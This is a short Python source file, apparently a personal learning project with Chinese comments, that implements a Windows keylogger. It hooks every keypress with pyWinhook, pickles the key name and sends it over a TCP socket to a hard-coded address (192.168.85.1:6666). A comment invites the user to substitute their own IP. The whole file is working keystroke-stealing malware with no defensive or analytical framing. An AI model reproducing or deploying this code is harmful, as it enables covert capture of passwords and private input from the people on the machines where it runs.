# _*_coding:utf_8_*_
# 代码仓库 was created by zy on 2022/2/13 19:08
#键盘监听
import pythoncom,pyWinhook,pickle,socket
from io import BytesIO
def Client_PIC(ip,port,obj):
    try:
        msg = pickle.dumps(obj)
        send_message = BytesIO(msg)
        send_message_fragment = send_message.read(1024)
    except:
        send_message = obj
        send_message_fragment = send_message.read(1024)

    socket_obj = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    socket_obj.connect((ip,port))

    while send_message_fragment:
        socket_obj.send(send_message_fragment)
        send_message_fragment = send_message.read(1024)
    socket_obj.close()


def OnkeyBoardEvent(event):
    dict_key = {}
    dict_key['MessageName'] = event.MessageName
    dict_key['Key'] = event.Key
    # Client_PIC('你自己的ip地址',6666,dict_key)
    Client_PIC('192.168.85.1', 6666, dict_key)
    return True

def Keylogger():
    hm = pyWinhook.HookManager()
    hm.KeyDown = OnkeyBoardEvent
    hm.HookKeyboard()
    pythoncom.PumpMessages()

if __name__ == '__main__':
    Keylogger()






